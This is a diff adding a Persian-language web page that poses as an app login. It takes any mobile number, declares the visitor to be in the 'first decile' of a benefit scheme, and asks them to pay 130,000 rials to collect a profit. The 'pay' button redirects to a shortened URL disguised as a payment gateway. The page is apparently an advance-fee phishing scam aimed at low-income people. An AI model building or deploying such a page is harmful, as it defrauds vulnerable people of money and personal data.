@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ورود به اپلیکیشن</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 400px;
+            margin: auto;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .success-message {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>ورود به اپلیکیشن</h1>
+        <div id="loginForm">
+            <input type="tel" id="phoneInput" placeholder="شماره درج شماره موبایل" required>
+            <button onclick="login()">ورود</button>
+        </div>
+        <div class="success-message" id="successMessage">
+            <h1>ورود موفقیت‌آمیز</h1>
+            <p>شما دهک اول هستید برای دریافت سود 130,000 ریال واریز کنید.</p>
+            <p>لطفاً مبلغ را واریز کنید.</p>
+            <button onclick="redirectToPayment()">واریز مبلغ</button>
+        </div>
+    </div>
+
+    <script>
+        function login() {
+            const phoneInput = document.getElementById('phoneInput').value;
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'block';
+            console.log('ورود موفقیت‌آمیز با شماره: ' + phoneInput);
+        }
+
+        function redirectToPayment() {
+            // آدرس درگاه پرداخت را اینجا وارد کنید
+            window.location.href = 'https://shorturl.at/reiDF'; // تغییر دهید به URL واقعی درگاه پرداخت
+        }
+    </script>
+
+</body>
+</html>
